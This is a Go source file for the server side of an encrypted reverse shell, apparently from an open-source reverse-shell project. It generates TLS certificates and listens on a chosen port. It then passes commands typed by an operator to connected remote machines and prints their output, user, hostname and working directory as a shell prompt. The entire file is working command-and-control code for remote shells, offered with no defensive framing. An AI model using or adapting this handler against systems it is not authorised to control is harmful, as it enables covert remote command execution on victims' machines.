package main

import (
	"bufio"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"os"
	"runtime"
	"strings"

	reverse "github.com/adedayo/reverse-shell/pkg"
)

var (
	terminator       = []byte("\000")[0] //use the 'null' byte to terminate strings
	terminatorString = string(terminator)
)

func main() {
	if len(os.Args) == 2 {
		if certFile, keyFile, err := reverse.GenCerts(); err == nil {
			cert, err := tls.LoadX509KeyPair(certFile, keyFile)
			if err != nil {
				log.Fatalf("Loadkeys : %s", err)
			}
			config := tls.Config{
				Certificates: []tls.Certificate{cert},
			}

			host := ""
			port := os.Args[1]
			listener, err := tls.Listen("tcp", net.JoinHostPort(host, port), &config)

			if err != nil {
				log.Fatalf("Listen error : %s", err)
			}
			defer listener.Close()

			for {
				conn, err := listener.Accept()
				if err != nil {
					log.Printf("Server accept err: %s", err)
					break
				}
				go handleConnection(conn)
			}
		}
	} else {
		fmt.Printf("Usage:\nserver-%s <local-port>\n", runtime.GOOS)
	}
}

func handleConnection(conn net.Conn) {
	println(" Got Connection ...")
	defer conn.Close()

	stdin := os.Stdin
	reader := bufio.NewReader(stdin)
	writer := bufio.NewWriter(conn)
	go func() {

		for {
			if command, err := reader.ReadString('\n'); err == nil {
				if _, err := writer.WriteString(fmt.Sprintf("%s\n", command)); err == nil {
					writer.Flush()
				} else {
					log.Fatalf("Error: %s", err)
				}
			}
		}
	}()

	connRead := bufio.NewReader(conn)
	for {
		if output, err := connRead.ReadString(terminator); err == nil {
			processOutput(output)
		}
	}
}

func processOutput(output string) {
	output = strings.Trim(output, terminatorString)
	var shell reverse.ShellOut
	if err := json.Unmarshal([]byte(output), &shell); err == nil {
		fmt.Printf("%s%s%s@%s:%s$ ", printOptional(shell.StdOut), printOptional(shell.StdErr), shell.User, shell.Hostname, shell.Dir)
	} else {
		fmt.Printf("%s", err.Error())
	}
}

func printOptional(data string) (out string) {
	data = strings.TrimSpace(data)
	if len(data) > 0 {
		out = fmt.Sprintf("%s\n", data)
	}
	return
}
